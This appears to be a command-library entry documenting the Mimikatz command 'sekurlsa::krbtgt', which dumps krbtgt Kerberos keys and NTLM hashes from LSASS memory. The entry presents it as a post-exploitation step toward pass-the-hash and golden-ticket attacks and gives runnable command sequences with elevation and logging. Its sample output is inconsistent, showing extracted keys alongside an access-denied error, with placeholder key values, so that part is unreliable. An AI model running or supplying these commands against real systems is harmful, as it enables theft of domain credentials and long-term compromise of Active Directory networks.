---
id: 3da6fa9f-d723-4f92-beea-e374faa541cc
name: mimikatz-sekurlsa-dump-krbtgt
type: command
executor: mimikatz
data: 'sekurlsa::krbtgt'
output: null
created_at: '2023-04-06T03:56:04.067244+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - credential-dumping
  - active-directory
verified: true
validated: true
---

# mimikatz-sekurlsa-dump-krbtgt

## Command

```cmd
sekurlsa::krbtgt
```

## Description

This Mimikatz command uses the sekurlsa module to dump the Kerberos keys and NTLM hash for the krbtgt account from the LSASS process memory. It is used during post-exploitation to harvest domain credentials for pass-the-hash or golden ticket attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ::krbtgt | Targets the krbtgt account specifically for hash extraction | Yes |

## Examples

### Basic Usage

Run within Mimikatz prompt after elevation:

```cmd
privilege::debug
sekurlsa::krbtgt
```

### With Logging

Enable logging first to capture output:

```cmd
log
sekurlsa::krbtgt
```

## Expected Output

Successful execution displays the krbtgt credentials, such as:

```
Kerberos keys for account 'krbtgt/LAB.LOCAL' on ticket 'krbtgt' with id 502:
  * NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0
  * AES128 : a1b2c3d4e5f678901234567890123456
  * AES256 : ...
ERROR kuhl_m_sekurlsa_acquireLSA ; OpenProcess (0x00000005)
```
(The NTLM hash is the key value for attacks; errors indicate insufficient privileges.)

## Related

- [[procedures/Dumping-AD-Domain-Credentials-using-Mimikatz-sekurlsa]]
- [[commands/mimikatz-lsadump-lsa-inject-krbtgt]]
